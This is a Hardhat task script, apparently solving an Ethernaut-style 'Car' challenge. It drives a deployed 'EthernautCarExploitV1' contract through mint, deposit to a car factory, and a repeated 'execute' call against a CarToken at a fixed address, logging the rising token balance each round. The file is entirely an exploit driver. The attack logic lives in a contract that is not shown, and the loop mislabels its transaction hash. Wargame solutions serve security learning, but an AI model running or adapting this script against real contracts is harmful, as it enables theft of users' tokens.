import { BigNumber } from 'ethers'
import { parseEther } from 'ethers/lib/utils'
import { task } from 'hardhat/config'

task('ethernautCarV1', 'ethernautCarV1').setAction(async (taskArguments, hre) => {
  const { deployer } = await hre.getNamedAccounts()
  const signer = await hre.ethers.getSigner(deployer)
  const HmifcDeployment = await hre.deployments.get('EthernautCarExploitV1')
  const hmifc = await hre.ethers.getContractAt('EthernautCarExploitV1', HmifcDeployment.address, signer)
  const carToken = await hre.ethers.getContractAt('IERC20', '0x82b9835f1013d9fc99dEfDc63eC4807998219b3b', signer)
  const minterCount = 10
  const amountToDeposit = parseEther(minterCount.toString())
  const tx1 = await hmifc.mintSelf({
    gasPrice: BigNumber.from(hre.config.networks[hre.network.name].gasPrice),
  })
  console.info(`Tx 1 ${tx1.hash} waiting`)
  const receipt1 = await tx1.wait()
  console.info(`Tx 1 ${tx1.hash} done gasUsed ${receipt1.gasUsed.toString()}`)

  const tx2 = await hmifc.mint(minterCount, {
    gasPrice: BigNumber.from(hre.config.networks[hre.network.name].gasPrice),
  })
  console.info(`Tx 2 ${tx2.hash} waiting`)
  const receipt2 = await tx2.wait()
  console.info(`Tx 2 ${tx2.hash} done gasUsed ${receipt2.gasUsed.toString()}`)

  const tx3 = await hmifc.transferToCarFactory(amountToDeposit, {
    gasPrice: BigNumber.from(hre.config.networks[hre.network.name].gasPrice),
  })
  console.info(`Tx 3 ${tx3.hash} waiting`)
  const receipt3 = await tx3.wait()
  console.info(`Tx 3 ${tx3.hash} done gasUsed ${receipt3.gasUsed.toString()}`)

  for (let i = 0; i < 3; i++) {
    const tx4 = await hmifc.execute(amountToDeposit, {
      gasPrice: BigNumber.from(hre.config.networks[hre.network.name].gasPrice),
    })
    console.info(`Tx 4 ${tx3.hash} waiting`)
    const receipt4 = await tx4.wait()
    console.info(`Tx 4 ${tx3.hash} done gasUsed ${receipt4.gasUsed.toString()}`)
    console.info(`Balance CarToken ${await carToken.balanceOf(HmifcDeployment.address)}`)
  }
})
